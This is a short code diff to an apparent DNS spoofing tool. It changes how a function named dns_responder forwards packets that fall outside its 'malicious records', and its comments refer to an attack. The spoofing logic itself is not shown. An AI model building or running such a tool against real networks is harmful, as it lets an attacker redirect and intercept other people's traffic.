@@ -91,10 +91,10 @@ def dns_responder(packet):
                 print(f"{queried_domain} DNS Response Sent!")
             else:
                 # Forward DNS queries not in the malicious records
-                send(packet, iface=INTERFACE, verbose=False)
+                send(packet.payload, iface=INTERFACE, verbose=False)
         else:
             # Forward Other Packets if not important to the attack
-            send(packet, iface=INTERFACE, verbose=False)
+            send(packet.payload, iface=INTERFACE, verbose=False)
     except Exception as e:
         print(f"Error processing packet: {e}")
 
